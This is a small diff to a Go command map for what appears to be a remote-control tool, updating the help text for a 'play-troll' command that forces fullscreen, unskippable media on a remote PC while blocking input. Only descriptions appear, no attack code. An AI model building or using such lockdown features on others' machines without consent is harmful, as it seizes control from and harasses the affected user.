@@ -115,7 +115,7 @@ var Known = map[string]string{
 	"send-notification":        "Show window on remote PC - send-notification <seconds|sticky> <text>",
 	"speak":                    "Speak text on remote PC - speak <text>",
 	"speak-stop":               "Stop remote speech",
-	"play-troll":               "Fullscreen unskippable media lockdown - play-troll <path|url> [seconds 1-3600] [noloop] (input blocked, auto-stops)",
+	"play-troll":               "Fullscreen unskippable media lockdown - play-troll <path|url> [seconds 1-3600] [noloop] (input blocked, auto-stops; Chromium fallback for odd files)",
 	"stop-troll":               "Stop troll player and unblock input",
 	"troll-status":             "Troll player state + last playback proof",
 	"troll-probe":              "Media open test, small visible window, no lockdown - troll-probe <path|url>",
